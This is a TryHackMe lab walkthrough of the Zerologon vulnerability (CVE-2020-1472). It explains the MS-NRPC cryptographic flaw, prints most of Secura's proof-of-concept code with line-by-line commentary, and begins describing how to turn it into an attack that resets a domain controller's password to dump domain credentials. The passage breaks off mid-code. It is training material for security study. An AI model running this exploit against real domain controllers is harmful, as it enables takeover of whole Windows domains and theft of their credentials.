aria-label=Anchor>#</a></span></h2><script src=https://tryhackme.com/badge/434937></script><h2 class="relative group">Room <a href=https://tryhackme.com/room/zer0logon target=_blank rel=noreferrer>Subscription Only</a><div id=room-subscription-only class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#room-subscription-only aria-label=Anchor>#</a></span></h2><hr><h3 class="relative group">About The vulnerability -<div id=about-the-vulnerability-- class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#about-the-vulnerability-- aria-label=Anchor>#</a></span></h3><p>On September 14, Secura released a whitepaper for CVE-2020-1472, that allowed an attacker to go from Zero to Domain Admin in approximately one minute. They dubbed this vulnerability Zero Logon.</p><p>Zero Logon is a purely statistics based attack that abuses a feature within MS-NRPC (Microsoft NetLogon Remote Protocol), MS-NRPC is a critical authentication component of Active Directory that handles authentication for User and Machine accounts. In short &ndash; the attack mainly focuses on a poor implementation of Cryptography. To be more specific, Microsoft chose to use AES-CFB8 for a function called ComputeNetlogonCredential, which is normally fine, except they had hard coded the Initialization Vector to use all zeros instead of a random string. When an attacker sends a message only containing zeros with the IV of zero, there is a 1-in-256 chance that the Ciphertext will be Zero.</p><h3 class="relative group">About Machine Accounts -<div id=about-machine-accounts-- class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#about-machine-accounts-- aria-label=Anchor>#</a></span></h3><p>Normally, if we tried a statistics based attack on any user account, we would get locked out. This is not the case if we apply this principal to machine accounts. Machines accounts behave in a much different way than standard user accounts. They have no predefined account lockout attempts because a 64+ character alpha numeric password is normally used to secure them, making them very difficult to break into. They&rsquo;re not meant to be accessed by an end user by any means. In certain circumstances, we can dump the machine account password using a tool like Mimikatz, but if we&rsquo;re at that point, we&rsquo;ve already compromised the machine &ndash; and we&rsquo;re looking for persistence within the domain, not lateral movement.</p><h3 class="relative group">Abusing the Vulnerability -<div id=abusing-the-vulnerability-- class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#abusing-the-vulnerability-- aria-label=Anchor>#</a></span></h3><p>Machine accounts often hold system level privileges which we can use for a variety of things. If you&rsquo;re not familiar with Active Directory, we can take the Domain Controller&rsquo;s Machine Account and attempt to use the granted authentication in conjunction with Secretsdump.py (SecretsDump is a password dumping utility like Mimikatz, except it lives on the Network instead of the host) to dump all of the passwords within the domain. At this point we have a rough kill chain starting to form:</p><p>Use Zero Logon to bypass authentication on the Domain Controller&rsquo;s Machine Account -> Run Secretsdump.py to dump credentials -> Crack/Pass Domain Admin Hashes -> ??? -> Profit</p><h3 class="relative group">Analyzing the MS-NRPC Logon Process -<div id=analyzing-the-ms-nrpc-logon-process-- class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#analyzing-the-ms-nrpc-logon-process-- aria-label=Anchor>#</a></span></h3><p>At this point, we know a vulnerability exists, but we&rsquo;re not quite sure how to exploit it yet. We&rsquo;ll be covering that soon, but what we do know there&rsquo;s a vulnerability within the way Microsoft handles Authentication within ComputeNetLogonCredetial function of MS-NRPC. To better understand the vulnerability, we need to do a bit of a deeper dive on how Microsoft handles authentication to NRPC.</p><p>To analyze where the vulnerability occurs, we&rsquo;ll be using the Diagram provided by Secura as well as Microsoft Documentation to decipher the magic behind Zero Logon. The sources can be found at the bottom of this task.</p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=zerologon src=https://raw.githubusercontent.com/anir0y/thm-notes/main/zerologon/img/fig.png></figure><p>Step 1. The client creates a NetrServerReqChallenge and sends it off [Figure 1. Step 1]. This contains the following values:</p><ol><li>The DC</li><li>The Target Device (Also the DC, in our case)</li><li>A Nonce (In our case is 16 Bytes of Zero).</li></ol><p>Step 2. The server receives the NetrServerReqChallenge, the server will then generate it&rsquo;s own Nonce (This is called the Server Challenge), the server will send the Server Challenge back. [Figure 1. Step 2]</p><p>Step 3. The client (us) will compute it&rsquo;s NetLogon Credentials with the Server Challenge provided [Figure 1. Step 3]. It uses the NetrServerAuthenticate3 method which requires the following parameters:</p><ol><li>A Custom Binding Handle (Impacket handles this for us, it&rsquo;s negotiated prior)</li><li>An Account Name (The Domain Controller&rsquo;s machine account name. ex: DC01$)</li><li>A Secure Channel Type (Impacket sort of handles this for us, but we still need to specify it: [nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel])</li><li>The Computer Name (The Domain Controller ex: DC01)</li><li>The Client Credential String (this will be 8 hextets of \x00 [16 Bytes of Zero])</li><li>Negotiation Flags (The following value observed from a Win10 client with Sign/Seal flags disabled: 0x212fffff Provided by Secura)</li></ol><p>Step 4. The server will receive the NetrServerAuthenticate request and will compute the same request itself using it&rsquo;s known, good values. If the results are good, the server will send the required info back to the client. [Figure 1. Step 4.]</p><p>At this point the attempt to exploit the Zero Logon vulnerability is under way. The above steps above will be looped through a certain number of times to attempt to exploit the Zero Logon vulnerability. The actual exploit occurs at Step 3 and 4, this where we&rsquo;re hoping for the Server to a have the same computations as the client. This is where are 1-in-256 chance comes in.</p><p>Step 5. If the server calculates the same value, the client will re-verify and once mutual agreement is confirmed, they will agree on a session key. The session key will be used to encrypt communications between the client and the server, which means authentication is successful. [Figure 1. Step 5]</p><p>From there, normal RPC communications can occur.</p><p>Sources -</p><ol><li>Tom Tervoort of Secura - <a href="https://www.secura.com/pathtoimg.php?id=2055" target=_blank rel=noreferrer>https://www.secura.com/pathtoimg.php?id=2055</a></li><li>Microsoft - <a href=https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/7b9e31d1-670e-4fc5-ad54-9ffff50755f9 target=_blank rel=noreferrer>https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/7b9e31d1-670e-4fc5-ad54-9ffff50755f9</a></li><li>Microsoft - <a href=https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/3a9ed16f-8014-45ae-80af-c0ecb06e2db9 target=_blank rel=noreferrer>https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/3a9ed16f-8014-45ae-80af-c0ecb06e2db9</a></li></ol><h2 class="relative group">Impacket Installation<div id=impacket-installation class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#impacket-installation aria-label=Anchor>#</a></span></h2><p>Git Clone Impacket -</p><p>As a prior warning, Impacket can be quite fussy when it comes to some modules within nrpc.py, because of this, we recommend using the TryHackMe Attack Box. This will make the exploit run faster, additionally, we can attempt to provide better support via the Attack Box. Additionally, we are going to be using a Virtual Environment to Install Impacket. The instructions to install Impacket are as follows:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 -m pip install virtualenv
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>python3 -m virtualenv impacketEnv
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>source</span> impacketEnv/bin/activate
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>pip install git+https://github.com/SecureAuthCorp/impacket</span></span></code></pre></div></div><p>After executing these commands, you should be placed within a Python3 Virtual Environment that will be compatible to modify the PoC to exploit Zero Logon.</p><h2 class="relative group">Modifying and Weaponizing the PoC<div id=modifying-and-weaponizing-the-poc class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#modifying-and-weaponizing-the-poc aria-label=Anchor>#</a></span></h2><h3 class="relative group">PoC and You -<div id=poc-and-you-- class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#poc-and-you-- aria-label=Anchor>#</a></span></h3><p>Proof of Concepts are incredibly important to every exploit, without them, the exploit&rsquo;s are almost entirely theoretical. Fortunately, Secura was able to provide a working Proof of Concept for Zero Logon that was 90% of the way there. We simply need to make an additional call to change the password to a null value, recall Figure 3 from Task 1, Secura was even kind enough to give us the method that we need to call (NetrServerPasswordSet2). Looking up the method within the Microsoft Documentation, it&rsquo;s very similar to hNetSeverAuthenticate3, so we&rsquo;re going to re-use some of the same variables from that, as well as the structure.</p><h3 class="relative group">Analyzing the PoC -<div id=analyzing-the-poc-- class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#analyzing-the-poc-- aria-label=Anchor>#</a></span></h3><p>Before we continue any further, you should download the PoC from Secura, which can be found here:</p><p><a href=https://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon_tester.py target=_blank rel=noreferrer>https://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon_tester.py</a></p><p>The script may seem quite daunting at first, but it&rsquo;s quite simple, if you think back to Figure 1 from Task 1, you&rsquo;ll quickly see how it all starts to fit together. Let&rsquo;s start by breaking the PoC down. We&rsquo;re going to be this in order of execution/importance so it&rsquo;s easier to digest:</p><p><strong>Lines 3 - 13</strong></p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>impacket.dcerpc.v5</span> <span class=kn>import</span> <span class=n>nrpc</span><span class=p>,</span> <span class=n>epm</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>impacket.dcerpc.v5.dtypes</span> <span class=kn>import</span> <span class=n>NULL</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>impacket.dcerpc.v5</span> <span class=kn>import</span> <span class=n>transport</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>impacket</span> <span class=kn>import</span> <span class=n>crypto</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hmac</span><span class=o>,</span> <span class=nn>hashlib</span><span class=o>,</span> <span class=nn>struct</span><span class=o>,</span> <span class=nn>sys</span><span class=o>,</span> <span class=nn>socket</span><span class=o>,</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>binascii</span> <span class=kn>import</span> <span class=n>hexlify</span><span class=p>,</span> <span class=n>unhexlify</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>subprocess</span> <span class=kn>import</span> <span class=n>check_call</span>
</span></span><span class=line><span class=cl><span class=n>MAX_ATTEMPTS</span> <span class=o>=</span> <span class=mi>2000</span></span></span></code></pre></div></div><p>Lines 1-4 import the required modules from Impacket, specifically the NRPC, EPM, Crypto, and Transport libraries. Additionally, on lines 6-8 a handful of other misc libraries are also imported, however, the Impacket libraries are the star of the show here. Lastly, on line 9, we&rsquo;re defining a constant (similar to a variable, but never changes) that sets the maximum number of retries for Zero Logon to 2000.</p><p>Lines 76 - 86</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=ow>not</span> <span class=p>(</span><span class=mi>3</span> <span class=o>&lt;=</span> <span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span> <span class=o>&lt;=</span> <span class=mi>4</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Usage: zerologon_tester.py &lt;dc-name&gt; &lt;dc-ip&gt;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Tests whether a domain controller is vulnerable to the Zerologon attack. Does not attempt to make any changes.&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Note: dc-name should be the (NetBIOS) computer name of the domain controller.&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=n>_</span><span class=p>,</span> <span class=n>dc_name</span><span class=p>,</span> <span class=n>dc_ip</span><span class=p>]</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>dc_name</span> <span class=o>=</span> <span class=n>dc_name</span><span class=o>.</span><span class=n>rstrip</span><span class=p>(</span><span class=s1>&#39;$&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>perform_attack</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\\\\</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=n>dc_name</span><span class=p>,</span> <span class=n>dc_ip</span><span class=p>,</span> <span class=n>dc_name</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	</span></span></code></pre></div></div><p>Next we skipped down to the very bottom of the script so some other variables will make sense later, Line 1 is essentially declaring a main function within Python, Line 2 we are checking for the amount of parameters, and ensuring that it&rsquo;s exactly 3 (zerologon_tester.py DCNAME IP). Lines 3-5 are printing the help menu only if it&rsquo;s greater than 3 arguments, or less than 2 and exiting. If the required arguments are supplied, on line 8 the arguments are being passed into two variables: dc_name, and dc_ip. After the arguments are passed, dc_name is being stripped of the &ldquo;$&rdquo; character, as the dc_name variable shouldn&rsquo;t have it. The user account name should however. Afterwards, it&rsquo;s passing the variables two variables and an additional, modified variable into a module called &ldquo;perform_attack&rdquo;.</p><p>Lines 57 - 73</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>perform_attack</span><span class=p>(</span><span class=n>dc_handle</span><span class=p>,</span> <span class=n>dc_ip</span><span class=p>,</span> <span class=n>target_computer</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Performing authentication attempts...&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=n>rpc_con</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=n>attempt</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>MAX_ATTEMPTS</span><span class=p>):</span>  
</span></span><span class=line><span class=cl>    <span class=n>rpc_con</span> <span class=o>=</span> <span class=n>try_zero_authenticate</span><span class=p>(</span><span class=n>dc_handle</span><span class=p>,</span> <span class=n>dc_ip</span><span class=p>,</span> <span class=n>target_computer</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>rpc_con</span> <span class=o>==</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>      <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;=&#39;</span><span class=p>,</span> <span class=n>end</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=n>flush</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>      <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=n>rpc_con</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>Success! DC can be fully compromised by a Zerologon attack.&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>Attack failed. Target is probably patched.&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	</span></span></code></pre></div></div><p>Line 1 is defining where the variables are being passed into for the local function, \DCNAME is being passed into the dc_handle variable, dc_ip is being passed into dc_ip variable, and dc_name is being passed into the target_computer variable. All of which will be used later, or passed into different modules.</p><p>Line 4 sets the variable rpc_con equal to none, this will be kept track of consistently to check and see if authentication is successful, if it&rsquo;s not, the script will continue until 2000 retries is hit. Line 5 is where the actual retries for Zero Logon occurs in the form of a for loop. Line 6 sets the rpc_con variable to the output of a different function called &ldquo;try_zero_authenticate&rdquo; with a couple of variables being passed to it, specifically dc_handle, dc_ip, and target_computer. All of which we addressed earlier. The next lines are simply checking if rpc_con is equal to a invalid login attempt, if it is, print =, if not, print success, if 2000 retries is hit: print attack failed.</p><p>Lines 20-25</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>def try_zero_authenticate<span class=o>(</span>dc_handle, dc_ip, target_computer<span class=o>)</span>:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nv>binding</span> <span class=o>=</span> epm.hept_map<span class=o>(</span>dc_ip, nrpc.MSRPC_UUID_NRPC, <span class=nv>protocol</span><span class=o>=</span><span class=s1>&#39;ncacn_ip_tcp&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>  <span class=nv>rpc_con</span> <span class=o>=</span> transport.DCERPCTransportFactory<span class=o>(</span>binding<span class=o>)</span>.get_dce_rpc<span class=o>()</span>
</span></span><span class=line><span class=cl>  rpc_con.connect<span class=o>()</span>
</span></span><span class=line><span class=cl>  rpc_con.bind<span class=o>(</span>nrpc.MSRPC_UUID_NRPC<span class=o>)</span>
</span></span><span class=line><span class=cl>  </span></span></code></pre></div></div><p>Lines 27-40</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl> <span class=nv>plaintext</span> <span class=o>=</span> b<span class=s1>&#39;\x00&#39;</span> * <span class=m>8</span>
</span></span><span class=line><span class=cl> <span class=nv>ciphertext</span> <span class=o>=</span> b<span class=s1>&#39;\x00&#39;</span> * <span class=m>8</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nv>flags</span> <span class=o>=</span> 0x212fffff
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   nrpc.hNetrServerReqChallenge<span class=o>(</span>rpc_con, dc_handle + <span class=s1>&#39;\x00&#39;</span>, target_computer + <span class=s1>&#39;\x00&#39;</span>, plaintext<span class=o>)</span>
</span></span><span class=line><span class=cl>  try:
</span></span><span class=line><span class=cl>    <span class=nv>server_auth</span> <span class=o>=</span> nrpc.hNetrServerAuthenticate3<span class=o>(</span>rpc_con, dc_handle + <span class=s1>&#39;\x00&#39;</span>, target_computer + <span class=s1>&#39;$\x00&#39;</span>, nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,target_computer + <span class=s1>&#39;\x00&#39;</span>, ciphertext, flags<span class=o>)</span></span></span></code></pre></div></div><p>Line 1 and 2 are establishing two new variables, plaintext and ciphertext containing 16 Bytes of &ldquo;\x00&rdquo; which will be used to exploit the Zero Logon vulnerability. Line 4 contains a variable called Flags. These are the default flags observed from a Windows 10 Client (using AES-CFB8) with the Sign and Seal bit disabled (Source/Credit: Secura).</p><p>Line 6 is where the fun beings &ndash; This is where Step 1 beings in Figure 1, the client creates a NetrServerReqChallenge containing the following information required by the <a href=https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/5ad9db9f-7441-4ce5-8c7b-7b771e243d32 target=_blank rel=noreferrer>Microsoft Documentation:</a></p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>NTSTATUS NetrServerReqChallenge<span class=o>(</span>
</span></span><span class=line><span class=cl>  <span class=o>[</span>in, unique, string<span class=o>]</span> LOGONSRV_HANDLE PrimaryName,
</span></span><span class=line><span class=cl>  <span class=o>[</span>in, string<span class=o>]</span> wchar_t* ComputerName,
</span></span><span class=line><span class=cl>  <span class=o>[</span>in<span class=o>]</span> PNETLOGON_CREDENTIAL ClientChallenge,
</span></span><span class=line><span class=cl><span class=o>)</span><span class=p>;</span></span></span></code></pre></div></div><p>The Primary Name being the DC Handle, the Computer Name being the Target Computer, and the Client Challenge being 16 bytes of &ldquo;\x00&rdquo;.</p><p>And the client will receive back, which will be used in Figure 1, Step 2:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>NTSTATUS NetrServerReqChallenge<span class=o>(</span>
</span></span><span class=line><span class=cl>   <span class=o>[</span>out<span class=o>]</span> PNETLOGON_CREDENTIAL ServerChallenge
</span></span><span class=line><span class=cl> <span class=o>)</span><span class=p>;</span></span></span></code></pre></div></div><p>Lines 8 sets up a try except (we&rsquo;ll see the rest of that in the next few lines), but in line 9 is where we actually attempt to exploit the Zero Logon vulnerability, this would be Figure 1, Step 3. This section requires a fair bit more information, per the Microsoft Documentation for NetrServerAuthenticate3, the following is required:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>NTSTATUS NetrServerAuthenticate3(
</span></span><span class=line><span class=cl>   [in, unique, string] LOGONSRV_HANDLE PrimaryName,
</span></span><span class=line><span class=cl>   [in, string] wchar_t* AccountName,
</span></span><span class=line><span class=cl>   [in] NETLOGON_SECURE_CHANNEL_TYPE SecureChannelType,
</span></span><span class=line><span class=cl>   [in, string] wchar_t* ComputerName,
</span></span><span class=line><span class=cl>   [in] PNETLOGON_CREDENTIAL ClientCredential,
</span></span><span class=line><span class=cl>   [in, out] ULONG * NegotiateFlags,
</span></span><span class=line><span class=cl> );</span></span></code></pre></div></div><p>On line 9, we supply the DC_Handle as the Primary Name, the Target Computer plus a $ as the Machine Account Name (Recall, Machine accounts do not have lockout policies), the Secure Channel Type as the Secure Channel Type previously established over RPC, the target_computer variable as the ComputerName, the Ciphertext (16 bytes of &ldquo;\x00&rdquo; attempting to Abuse Zero Logon, remember there&rsquo;s 1-in-256 chance that the Ciphertext will be the same as the plaintext), and lastly, our flags variable that mimics those of a Windows 10 client machine.</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>NTSTATUS NetrServerAuthenticate3<span class=o>(</span>
</span></span><span class=line><span class=cl>  <span class=o>[</span>out<span class=o>]</span> PNETLOGON_CREDENTIAL ServerCredential,
</span></span><span class=line><span class=cl>  <span class=o>[</span>in, out<span class=o>]</span> ULONG * NegotiateFlags,
</span></span><span class=line><span class=cl>  <span class=o>[</span>out<span class=o>]</span> ULONG * AccountRid
</span></span><span class=line><span class=cl><span class=o>)</span><span class=p>;</span></span></span></code></pre></div></div><p>Additionally, we expect to receive two (possibly 3) things back from the Server upon (hopefully) successful exploitation of Zero Logon: The ServerCredential and AccountRid, only one of which we are going to use.</p><p>Line 44 - 54</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>    assert server_auth<span class=o>[</span><span class=s1>&#39;ErrorCode&#39;</span><span class=o>]</span> <span class=o>==</span> <span class=m>0</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> rpc_con
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  except nrpc.DCERPCSessionError as ex:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> ex.get_error_code<span class=o>()</span> <span class=o>==</span> 0xc0000022:
</span></span><span class=line><span class=cl>      <span class=k>return</span> None
</span></span><span class=line><span class=cl>    <span class=k>else</span>:
</span></span><span class=line><span class=cl>      fail<span class=o>(</span>f<span class=s1>&#39;Unexpected error code from DC: {ex.get_error_code()}.&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  except BaseException as ex:
</span></span><span class=line><span class=cl>    fail<span class=o>(</span>f<span class=s1>&#39;Unexpected error: {ex}.&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>	</span></span></code></pre></div></div><p>Line 1 is retrieving the Error Code from the Server_auth variable, or the variable assigned to establish an Authentication Session with the target device. If successful, we&rsquo;re going to return the rpc_con variable which will inform us that we have successfully bypassed Authentication with Zero Logon. Lines 3-12 are simply Error handling lines so the program doesn&rsquo;t break and exit after receiving an error back.</p><h3 class="relative group">End of Transmission, What&rsquo;s Next? -<div id=end-of-transmission-whats-next-- class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#end-of-transmission-whats-next-- aria-label=Anchor>#</a></span></h3><p>And that&rsquo;s all there is to the Proof of Concept. It&rsquo;s not some giant, scary monster. It even successfully exploit the Zero Logon vulnerability for us &ndash; but it stops and doesn&rsquo;t do anything further, so how do we proceed?</p><p>Good question, next we need to take a look at the Microsoft Documentation itself and see what we can do to interact with NRPC Itself. If you&rsquo;re not familiar with NRPC, and you&rsquo;re not that technical of an individual, look back at the last step in Task 1, Figure 3 (hint: It tells us what we need to do).</p><h3 class="relative group">What&rsquo;s It All Mean, Doc? -<div id=whats-it-all-mean-doc-- class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#whats-it-all-mean-doc-- aria-label=Anchor>#</a></span></h3><p>After going back and peaking at Figure 3 on Task 1, or researching how to reset a password over RDP, you should have came across the following document:
<a href=https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81 target=_blank rel=noreferrer>https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81</a></p><p>The document outlines what information is required to change a password over NRPC. The following information is required to do so:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=n>NTSTATUS</span> <span class=n>NetrServerPasswordSet2</span><span class=p>(</span>
</span></span><span class=line><span class=cl>   <span class=p>[</span><span class=ow>in</span><span class=p>,</span> <span class=n>unique</span><span class=p>,</span> <span class=n>string</span><span class=p>]</span> <span class=n>LOGONSRV_HANDLE</span> <span class=n>PrimaryName</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=p>[</span><span class=ow>in</span><span class=p>,</span> <span class=n>string</span><span class=p>]</span> <span class=n>wchar_t</span><span class=o>*</span> <span class=n>AccountName</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=p>[</span><span class=ow>in</span><span class=p>]</span> <span class=n>NETLOGON_SECURE_CHANNEL_TYPE</span> <span class=n>SecureChannelType</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=p>[</span><span class=ow>in</span><span class=p>,</span> <span class=n>string</span><span class=p>]</span> <span class=n>wchar_t</span><span class=o>*</span> <span class=n>ComputerName</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=p>[</span><span class=ow>in</span><span class=p>]</span> <span class=n>PNETLOGON_AUTHENTICATOR</span> <span class=n>Authenticator</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=p>[</span><span class=ow>in</span><span class=p>]</span> <span class=n>PNL_TRUST_PASSWORD</span> <span class=n>ClearNewPassword</span>
</span></span><span class=line><span class=cl> <span class=p>);</span></span></span></code></pre></div></div><p>Going back and looking at <a href=https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/3a9ed16f-8014-45ae-80af-c0ecb06e2db9 target=_blank rel=noreferrer>NetrServerAuthenticate3</a> and <a href=https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81 target=_blank rel=noreferrer>NetrServerPasswordSet2</a>, we already have a handful of the information required, like the Primary Name, Account Name, Secure Channel Type, and the Computer Name. So we simply need two values, the Authenticator and the ClearNewPassword value. Both of these are documented from Microsoft, so lets take a look at the <a href=https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/76c93227-942a-4687-ab9d-9d972ffabdab target=_blank rel=noreferrer>Authenticator</a> first:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>typedef</span> <span class=n>struct</span> <span class=n>_NETLOGON_AUTHENTICATOR</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>NETLOGON_CREDENTIAL</span> <span class=n>Credential</span><span class=p>;</span>
